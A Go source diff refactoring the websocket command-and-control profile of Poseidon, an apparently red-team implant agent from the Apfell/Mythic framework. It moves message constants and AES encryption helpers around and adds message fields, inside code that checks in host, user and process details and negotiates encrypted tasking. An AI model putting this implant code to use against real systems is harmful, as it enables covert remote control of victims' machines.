@@ -19,31 +19,6 @@ import (
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
-const (
-	//CheckInMsg - Messages for apfell
-	CheckInMsg = 0
-	//EKE - Messages for apfell EKE AES
-	EKE = 1
-	//AES - Messages for apfell static AES
-	AES = 2
-	//TaskMsg - Messages for apfell tasks
-	TaskMsg = 3
-	//ResponseMsg - Messages for apfell task responses
-	ResponseMsg = 4
-	//FileMsg - Messages for apfell file downloads/uploads
-	FileMsg = 5
-	// ID Type for UUID
-	UUIDType = 6
-	// ID Type for ApfellID
-	ApfellIDType = 7
-	// ID Type for FileID
-	FileIDType = 8
-	// ID Type for session ID
-	SESSIDType = 9
-	// ID Type for Task ID
-	TASKIDType = 10
-)
-
 var (
 	websocketEndpoint = "socket"
 )
@@ -324,7 +299,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 }
 
 func (c *C2Websockets) NegotiateKey() string {
-	sessionID := c.GenerateSessionID()
+	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.SetRsaKey(priv)
 	initMessage := structs.EKEInit{}
@@ -347,7 +322,7 @@ func (c *C2Websockets) NegotiateKey() string {
 		//log.Printf("Error decoding string %s ", err.Error())
 		return ""
 	}
-	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaPrivateKey)
+	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaKey())
 	sessionKeyResp := structs.SessionKeyResponse{}
 
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
@@ -363,29 +338,11 @@ func (c *C2Websockets) NegotiateKey() string {
 
 }
 
-func (c *C2Websockets) getData() []byte {
-	m := structs.Message{}
-	err := c.Conn.ReadJSON(&m)
-
-	if err != nil {
-		return make([]byte, 0)
-	}
-
-	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
-		data, _ := base64.StdEncoding.DecodeString(m.Data)
-		decData := c.decryptMessage(data)
-		return decData
-	}
-
-	decData, _ := base64.StdEncoding.DecodeString(m.Data)
-	return decData
-}
-
 func (c *C2Websockets) sendData(msgType int, idType int, id string, tag string, data []byte) []byte {
 	m := structs.Message{}
 
 	if len(c.AesPreSharedKey()) != 0 {
-		m.Data = string(c.encryptMessage(data))
+		m.Data = string(EncryptMessage(data, c.AesPreSharedKey()))
 	} else {
 		m.Data = string(data)
 	}
@@ -393,6 +350,8 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, tag string, 
 	m.MType = msgType
 	m.IDType = idType
 	m.ID = id
+	m.Tag = tag
+	m.Client = true
 	//log.Printf("Sending message %+v\n", m)
 	err := c.Conn.WriteJSON(m)
 
@@ -407,30 +366,10 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, tag string, 
 
 	//log.Printf("Received message %+v\n", respMsg)
 	// If the AES key is set, exchanging keys is true, and the message is encrypted
-	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
-		return c.decryptMessage([]byte(respMsg.Data))
+	if len(c.AesPreSharedKey()) != 0 && c.ExchangingKeys != true {
+		return DecryptMessage([]byte(respMsg.Data), c.AesPreSharedKey())
 	}
 
 	return []byte(respMsg.Data)
 
-}
-
-func (c *C2Websockets) encryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
-	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
-}
-
-func (c *C2Websockets) decryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
-	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
-	return crypto.AesDecrypt(key, decMsg)
-}
-
-func (c *C2Websockets) GenerateSessionID() string {
-	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, 10)
-	for i := range b {
-		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
-	}
-	return string(b)
 }
